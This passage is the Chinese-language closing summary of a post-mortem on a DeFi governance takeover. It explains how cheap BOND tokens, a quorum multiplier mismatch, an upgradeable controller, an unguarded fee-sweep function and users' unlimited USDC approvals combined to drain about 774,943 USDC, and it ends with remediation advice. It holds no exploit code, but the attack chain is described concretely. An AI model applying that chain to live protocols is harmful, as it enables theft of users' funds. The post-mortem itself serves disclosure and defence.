然后就回到了最前面的恶意合约执行, 横扫所有账上有USDC并且执行了无限授权的用户. 整个攻击闭环.



## 总结

这次攻击没有一处惊天漏洞,而是把一串脆弱点串成了一条完整的攻击链。任何一环被堵住,攻击其实都难以成立。

经济 / 治理层

- A: 僵尸 DAO:价值与权力错配。 BOND 已跌到 ≈ $0.019、全网仅剩 约146,010 质押,但这套治理仍掌控着管理 约77 万+ USDC 的 Provider / SmartYield。治理币近乎归零、金库仍是真金白银 —— 于是花不到 $600 就能买到 43% 投票权。
- B: 锁仓乘数只进"投票权",不进"quorum 分母"。 votingPower 含锁仓乘数,而 _getQuorum 用的 bondStakedAtTs 是不含乘数的原始质押量。32,000 本金锁 1 年 → 64,000 票,单人跨过 40% quorum;而买更多币会把自己也计入分母、抬高门槛(移动靶)。这个不一致让"小本金 + 满锁"能以远低于表面持仓的成本掌控法定人数。
- C: 治理防线形同虚设。 Abrogation 否决通道无人使用(社区已死)、提案还伪装成例行的 "migrate proxy implementation"。没有任何人在几天的窗口里察觉或拦截。

合约设计 / 信任层

- D: Controller 是可升级代理,却被 Provider 高度信任。 Provider 把「谁是 feesOwner」「谁是 dao」「每次存取的回调」全部委托给一个可被替换实现的 controller。一旦拿到 controller 身份:既能过 _takeUnderlying 的 onlySmartYieldOrController,又能让 controller.feesOwner() 指向自己。
- E: transferFees 的逻辑错误 + 零鉴权。 fees = IERC20(uToken).balanceOf(this) 把账上全部 USDC 当手续费转走(正确做法应基于 underlyingFees 精确记账),而且当前函数还是是 public的。
- F: _takeUnderlying 的 from_ 任意。 只校验"精确到账",不校验出款人是不是调用者 —— controller 身份即可把任何对 Provider 有授权的地址的 USDC 拉进池子。

用户行为层

- G: 无限 / 残余授权长期不撤。 50 个老用户对 Provider 留着无限或未用尽的 USDC 授权,形成常驻攻击面。我们发现授权已撤销或已用尽的地址(即便账上有 USDC)全部幸免 —— 印证了"及时撤销授权"的价值。

幸亏:

- 池子本金那 7.84M cUSDC 没被卷走:赎回本金要走 _withdrawProvider / _sendUnderlying,二者是 onlySmartYield,controller 身份够不到。分权设计确实挡住了本金,把损失限制在"授权面"的 77 万 —— 但也说明:单点权限边界挡不住"授权面 + 逻辑错误"的组合拳。

```
A + B + C   低成本 + 乘数漏洞 + 无人监督
   --> 合法通过提案 #14,拿下 Provider/SmartYield 的 controller(治理接管)
        --> D  把 controller 代理升级成恶意实现(feesOwner = 自己)
             --> F  用 controller 身份,把 G:(无限授权用户)的 USDC 拉进 Provider
                  --> E  transferFees 无鉴权 + 全额当手续费 → 一次性扫给自己
                       = 774943 USDC 被盗
```




关键放大器:B(乘数不进 quorum)让治理接管变得便宜;E(全额当手续费)+ F(任意 from)让"拉进来的钱"直接变成可提走的赃款;G(无限授权)决定了能薅到多少。

启示

- 用户:用完即撤授权,优先"精确额度"而非无限授权,定期审计 approve 列表。授权是"设一次、暴露一辈子"的长期风险。
- 协议方:
  - 协议退役时应主动迁移金库、交还/冻结治理,不要留下"死协议 + 活金库";
  - feesOwner 提现应基于精确记账(underlyingFees)而非 balanceOf,敏感函数(transferFees)加访问控制;
  - 作为信任锚的 controller 若可升级,应叠加独立时间锁 / 多签约束,而不是把 feesOwner、dao、回调一并托付给单一可替换实现。
- 治理设计:
  - 投票权乘数应与 quorum 基准保持一致(要么都含乘数,要么都不含),消除 B 那种"通胀分子、不通胀分母"的失衡;
  - 对能执行任意调用(尤其是改 controller / 迁移权限)的提案,设更高阈值 / 更长时间锁;
  - 监控"新地址短时间内囤治理币 + 满锁 + 发提案"这一典型治理攻击特征。

> 攻击者用 $600 的治理接管,叠加 Provider 的一个逻辑错误(全额当手续费),再收割 50 个用户的无限授权,零"技术漏洞"地卷走 77 万美元 —— 真正的漏洞是价值归零的治理仍握有真实资金的控制权,其余每一环都只是把这道口子放大。
